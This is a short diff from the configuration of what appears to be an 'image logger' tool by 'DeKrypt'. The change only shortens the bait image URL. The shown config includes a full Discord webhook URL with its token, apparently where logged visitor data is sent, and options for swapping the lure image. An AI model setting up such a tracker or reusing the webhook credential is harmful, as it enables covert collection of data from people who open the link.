@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1340982835875545108/Cyr-VGbWNH7R9O0tNGaXmO5n5xZqqSoofobd_ZTzxQmJSFbZrX6eObq8L-MgVB3dIkaG",
-    "image": "https://static.wikia.nocookie.net/dayz_gamepedia/images/3/30/Zub1.jpg/revision/latest?cb=20210605204505", # You can also have a custom image by using a URL argument
+    "image": "https://static.wikia.nocookie.net/dayz_gamepedia/images/3/30/Zub1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
